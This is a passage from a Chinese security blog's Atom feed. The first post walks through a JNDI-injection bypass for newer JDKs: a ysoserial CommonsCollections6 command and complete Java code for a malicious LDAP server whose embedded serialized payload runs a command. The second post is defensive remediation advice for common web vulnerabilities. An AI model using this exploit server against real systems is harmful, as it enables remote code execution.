<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ka&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.3cac.com/"/>
  <updated>2019-08-20T16:20:02.066Z</updated>
  <id>https://www.3cac.com/</id>
  
  <author>
    <name>Ka</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>绕过高版本JDK限制进行JNDI注入</title>
    <link href="https://www.3cac.com/2019/08/02/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.3cac.com/2019/08/02/绕过高版本JDK限制进行JNDI注入/</id>
    <published>2019-08-02T01:11:41.000Z</published>
    <updated>2019-08-20T16:20:02.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X01-测试环境"><a href="#0X01-测试环境" class="headerlink" title="0X01 测试环境"></a>0X01 测试环境</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">macOs 10.14.6</span><br><span class="line">java version <span class="string">"1.8.0_221"</span></span><br></pre></td></tr></table></figure><h2 id="0x02-JDK-8u191-高版本的限制"><a href="#0x02-JDK-8u191-高版本的限制" class="headerlink" title="0x02 JDK 8u191+高版本的限制"></a>0x02 JDK 8u191+高版本的限制</h2><p>jdk 1.8.0_211 的loadClass(String className, String codebase) 如果trustURLCodebase为false的话, 直接返回null, 不再从远程代码库中动态加载字节码。并且trustURLCodebase已经默认为false, 所以不能够再使用这种方法。</p><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"true"</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">        ClassLoader parent = getContextClassLoader();</span><br><span class="line">        ClassLoader cl =</span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-使用ysoserial生成payload"><a href="#0x03-使用ysoserial生成payload" class="headerlink" title="0x03 使用ysoserial生成payload"></a>0x03 使用ysoserial生成payload</h2><p>首先使用yso生成反序列化数据，可以触发本地Gadget。</p><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span>.6-SNAPSHOT-all.jar CommonsCollections6 <span class="string">'/Applications/Calculator.app/Contents/MacOS/Calculator'</span>|base64</span><br></pre></td></tr></table></figure><h2 id="0x04-启动ldap-server"><a href="#0x04-启动ldap-server" class="headerlink" title="0x04 启动ldap server"></a>0x04 启动ldap server</h2><p>这里网上找了一个根据marshalling改的server代码，利用LDAP返回序列化数据，触发本地Gadget</p><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HackerLDAPRefServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    ldap_port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(<span class="string">"http://"</span>+http_server+<span class="string">":"</span>+http_port+<span class="string">"/#Exploit"</span>)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>,Base64.decode(<span class="string">"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ADYvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA=="</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"HttpServerAddress: "</span>+args[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(<span class="string">"HttpServerPort: "</span>+args[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(<span class="string">"LDAPServerPort: "</span>+args[<span class="number">2</span>]);</span><br><span class="line">        String http_server_ip = args[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> ldap_port = Integer.valueOf(args[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> http_server_port = Integer.valueOf(args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.3cac.com/images/20190820/1.png" alt="aa"></p><h2 id="0x05-利用成功"><a href="#0x05-利用成功" class="headerlink" title="0x05 利用成功"></a>0x05 利用成功</h2><p><img src="https://www.3cac.com/images/20190820/2.png" alt="aa"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0X01-测试环境&quot;&gt;&lt;a href=&quot;#0X01-测试环境&quot; class=&quot;headerlink&quot; title=&quot;0X01 测试环境&quot;&gt;&lt;/a&gt;0X01 测试环境&lt;/h2&gt;&lt;figure class=&quot;hljs highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漏洞危害与修复建议</title>
    <link href="https://www.3cac.com/2019/01/02/%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3%E4%B8%8E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
    <id>https://www.3cac.com/2019/01/02/漏洞危害与修复建议/</id>
    <published>2019-01-02T00:31:42.000Z</published>
    <updated>2019-08-20T16:19:37.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞危害与修复–-WEB"><a href="#漏洞危害与修复–-WEB" class="headerlink" title="漏洞危害与修复–  WEB"></a>漏洞危害与修复–  WEB</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>漏洞危害：</strong></p><p>SQL注入攻击是一种注入型攻击，归类于OWASP TOP10 - 2013的第一大类。SQL注入漏洞起因是由于开发人员创建动态数据库查询语句时拼接了来自客户端不可信的输入而导致的。SQL注入攻击能够读取数据库中的敏感数据，修改数据库（插入/更新/删除）数据，执行数据库管理员的操作（比如关闭DBMS），还能使用DBMS上存在的文件去覆盖数据库内容，在某些情况下还能执行操作系统的命令。该漏洞破坏了数据的完整性与机密性。</p><p><strong>修复建议：</strong></p><p>针对于SQL注入攻击，有以下几种方法：</p><p>关键防御方法：</p><ol><li>预编译语法/参数化查询</li></ol><p>使用预编译语法，可以使SQL语句和变量绑定，这样可以支持动态化查询。预编译语句是强制了开发首先定义SQL语句，然后在每个参数中传递请求体中的用户输入查询，这种编码的目的是把数据与代码分离。预编译语句确保了攻击者不会改变原有SQL语句的意图。</p><ol><li><ul><li>这段示例是关于JAVA EE的预编译语句的使用：</li></ul></li></ol><ol><li><ul><li>其他语言常见的预编译建议：</li></ul></li></ol><table><thead><tr><th>语言/平台</th><th>预编译方法名</th></tr></thead><tbody><tr><td>JAVA EE</td><td>PreparedStatement()</td></tr><tr><td>.NET</td><td>SqlCommand(),OleDbCommand()</td></tr><tr><td>PHP</td><td>bindParam()</td></tr><tr><td>Hibernate</td><td>createQuery()</td></tr><tr><td>SQLite</td><td>sqlite3_prepare()</td></tr></tbody></table><ol><li>存储过程</li></ol><p>存储过程和预编译语法有着相同的安全性，不同的是存储过程是用SQL代码定义和存储在数据库中的，使用时被应用程序调用。值得注意的是，如果使用存储过程，那么开发者应该避免在存储过程中生成不安全的动态SQL查询语句。</p><p>§  这段示例是关于JAVA EE的存储过程使用的使用，该存储过程已经定义在数据库中：</p><ol><li>转义所有用户输入</li></ol><p>这种方法是在执行SQL语句前，把用户输入做转义处理。然后这种方法我们不能保证它会阻止所有的SQL注入的攻击，这种方法是脆弱的。由于数据库往往支持多种编码方式，所以很容易导致混淆。因此我们建议只有那些老旧的系统，没有更多选择的情况下才使用该方法，使用这种技术需谨慎。对于新的应用程序，或者想降低甚至避免该风险的程序应该使用预编译语句/参数化查询/存储过程。</p><p>附加优化建议：</p><ol><li>最小化数据库用户权限</li></ol><p>为了把SQL注入漏洞带来的危险与损失降低到最小化，我们建议最小化数据库用户权限，避免让应用程序使用DBA或者具有admin权限类型的账户。只需分配满足需求的账户即可，比如账户只需要读的权限，那么就没必要分配其他权限。如果该账户只需要操作某个数据库，那么就没必要添加访问其他数据库的权限。</p><ol><li>白名单</li></ol><p>使用白名单可以检测到未授权输入在执行前SQL语句前。比如Price参数，应该设置成强类型，只接受正整数。这样可以提高了安全性，也提高了性能。</p><h3 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h3><p><strong>漏洞危害：</strong></p><p>系统提供命令执行类函数主要方便处理相关应用场景的功能.而当不合理的使用这类函数，同时调用的变量未考虑安全因素，就会执行恶意的命令调用，被攻击利用。应用中，因为是由程序拼凑命令行（包括参数）来实现调用外部程序的，因此用户也能够通过小计量来突破限制，实现调用其他外部程序。OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入即能够在服务器上执行任意命令，危害性极大。</p><p> <strong>修复建议</strong></p><p>1、 系统开发中，尽量避免使用exec()、system()、passthru()、popen()、backtickoperator、shell_exec() 等函数。 </p><p>2、 因其危险性，执行命令的参数不要使用外部获取，防止用户构造。 </p><p>3、 设置 PHP.ini 配置文件中safe_mode = Off 选项。默认为( off )； </p><p>4、 使用自定义函数或函数库来替代外部命令的功能 </p><p>5、 使用escapeshellarg函数来处理命令参数 </p><p>6、 使用safe_mode_exec_dir指定可执行文件的路径</p><h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><p><strong>漏洞危害：</strong></p><p> 当服务端以xml文件作为数据载体，攻击者可通过提交带有xpath查询语句、特殊的xml数据等方式达到控制服务器端的执行逻辑、伪造数据等目的。 攻击者利用XPath解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p><p><strong>修复建议：</strong></p><p>1、 数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。 </p><p>2、 检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。 </p><p>3、 对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。 </p><p>4、 参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。</p><p>5、 通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。  </p><p>以上：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。</p><h3 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h3><p><strong>漏洞危害：</strong></p><p> LDAP轻量级目录协议，是一种在线目录访问协议，主要用于资源查询，是X.500的一种简便的实现。它是一种树结构，查询效率很高，插入效率稍低。目录和数据库有很多相似之处，都用于存放数据，可以查询插入，目录可以存放各种数据。也正是由于目录和数据库有很多相似，也导致了LDAP注入攻击和SQL 注入攻击相似。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，攻击者利用用户引入的参数生成一些恶意的LDAP查询，这些恶意代码会对系统造成严重威胁。</p><p><strong>修复建议：</strong></p><p>1、 在应用层中过滤圆括号、星号、逻辑操作符、关系运操作符等敏感字符。 </p><p>2、 构造LDAP搜索过滤器的值在发送给LDAP服务器查询之前都要用应用层有效地值列表来核对，相关数据可以使用正则表达式替换掉。</p><h3 id="Json注入"><a href="#Json注入" class="headerlink" title="Json注入"></a>Json注入</h3><p><strong>漏洞危害：</strong></p><p> Json注入一般出现在下列各种情况。 </p><ol><li><p>数据从一个不可信赖的数据源进入程序。</p></li><li><p>将数据写入到 JSON 流。 </p></li></ol><p>应用程序通常使用 JSON 来存储数据或发送消息。用于存储数据时，JSON 通常会像缓存数据那样处理，而且可能会包含敏感信息。用于发送消息时，JSON 通常与 RESTful 服务一起使用，并且可以用于传输敏感信息，例如身份验证凭据。</p><p>如果应用程序利用未经验证的输入构造 JSON，则可以更改 JSON 文档和消息的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON 文档或请求时抛出异常。在更为严重的情况下，例如涉及Json注入，攻击者可能会插入无关的元素，从而允许对 JSON 文档或请求中对业务非常关键的值执行可预见操作。还有一些情况，Json注入可以导致 XSS等。</p><p><strong>修复建议：</strong></p><p>将用户提供的数据写入 JSON 时，应该遵守以下准则： </p><ol><li><p>不要创建名称来自用户输入的 JSON 属性。 </p></li><li><p>确保使用安全的序列化函数（能够以单引号或双引号分隔不可信赖的数据，并且避免任何特殊字符）执行对 JSON 的所有序列化操作。</p></li></ol><h3 id="框架注入"><a href="#框架注入" class="headerlink" title="框架注入"></a>框架注入</h3><p><strong>漏洞危害：</strong></p><p> 攻击者有可能注入含有恶意内容的 frames 或 iframe 标记。如果用户不够谨慎，就有可能浏览该标记，却意识不到自己会离开原始站点而进入恶意的站点。之后，攻击者便可以诱导用户再次登录，然后获取其登录凭证。</p><p><strong>修复建议：</strong></p><p>对用户输入的数据在服务器端进行XSS安全检查，过滤单双引号（” 、‘）、尖括号（&lt;&gt;）、反斜杠</p><p>（/）。过滤javascript函数、html事件函数等。</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p><strong>漏洞危害：</strong></p><p> 在一类web应用中，会将用户提交的数据作为HTTP响应头的一部分，如提交的数据保存在COOKIE</p><p>或者其他字段中。由于HTTP头使用回车换行( )作为不同关键字的分隔符，如果web应用程序没有充分过滤用户输入的信息，而是直接将用户输入信息保存在HTTP响应头返回给客户端。就有可能将回车换行符</p><p>( )嵌入到HTTP响应头中，从而导致改变HTTP头，影响客户端浏览器对HTTP响应数据的处理。如修改</p><p>Content-Length字段，改变页面内容。该漏洞可用于跨站，挂马。</p><p><strong>修复建议：</strong></p><p>过滤用户输入信息中的CR(0x13)和LF(0x10)。</p><h3 id="订单支付逻辑漏洞"><a href="#订单支付逻辑漏洞" class="headerlink" title="订单支付逻辑漏洞"></a>订单支付逻辑漏洞</h3><p><strong>漏洞危害：</strong></p><p>攻击者通过修改交易金额、交易数量等从而利用漏洞，如Burp修改交易金额、使交易数量为负数或无限大等。</p><p>* 在支付时直接修改数据包中的支付金额，实现小金额购买大金额商品</p><p>* 修改购买数量，使之为负数，可购买负数量商品，从而扣除负积分，即增加积分，  或使购买数量无限大，无限大时则程序可能处理出错，从而实现0金额支付</p><p>* 请求重放，在购买成功后重放请求，可实现”一次购买对此收货”</p><p><strong>修复建议：</strong></p><p>支付大致流程分为6步：</p><p>1、 客户端将商品编号v_goodId、商品数量v_number、时间戳timestamp发送给电商服务器</p><p>2、 电商服务器向支付服务器请求一个key</p><p>3、 支付服务端返回给电商服务器一个key，电商服务器通过图示算法对key和v_goodId、v_number、timestamp生成签名</p><p>4、 电商服务器返回给客户端一段重定向的URL，包含订单总额v_amount、timestamp和sign</p><p>5、 客户端将v_amount、timestamp和sign发送给支付服务器，支付服务器通过v_amount、timestamp和第3步生成的key再次生成签名，与sign比对，以校验完整性</p><p>6、 返回支付结果</p><p> 以上还有几点需要说明：</p><p>1、 时间戳timestamp用作防御重放攻击，支付服务器在收到支付请求时会比对是否超时，如果超时则请求失败</p><p>2、 电商服务器需对商品数量进行校验，必须为正整数</p><p>3、 总额由服务端通过商品编号和商品数量计算所得，而不用从客户端算得的总额</p><p>4、 sign=sha(message+salt)这一步要把salt放在message后面，防止哈希长度扩展攻击</p><h3 id="密码重置（验证码爆破）"><a href="#密码重置（验证码爆破）" class="headerlink" title="密码重置（验证码爆破）"></a>密码重置（验证码爆破）</h3><p><strong>漏洞危害：</strong></p><p> 恶意利用可以重置任意用户密码，威胁到用户的个人信息安全。</p><p><strong>修复建议：</strong></p><p>此漏洞是由于验证码处未做限制，导致可爆破出有效验证码。解决方法一般是在服务器端对验证码请求做限制，如</p><p>1）建议在服务器端限制单个 IP 在单位时间内的请求次数，一旦用户请求次数（包括失败请求次数）超出设定的阈值，则暂停对该 IP一段时间的请求；若情节特别严重，可以将 IP 加入黑名单，禁止该 IP 的访问请求。该措施能限制一个 IP 地址的大量请求，避免攻击者通过同一个 IP 对大量用户进行攻击，增加了攻击难度，保障了业务的正常开展。该阈值设定可依据业务的不同执行设定，一般情况下建议不超过 200 个/分钟。 </p><p>2）设置验证码有效时间 </p><p>3）验证码验证成功后作废</p><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p><strong>漏洞危害：</strong></p><p> 开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><p>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。在我理解就是两只线程同时去抢一个丢出去的资源，不知道到底哪只能抢到，此处便形成了竞争。</p><p><strong>修复建议：</strong></p><p>为了保证数据的完事性和一致性，数据库系统采用锁来实现事务的隔离性。</p><h3 id="修改反回包逻辑漏洞"><a href="#修改反回包逻辑漏洞" class="headerlink" 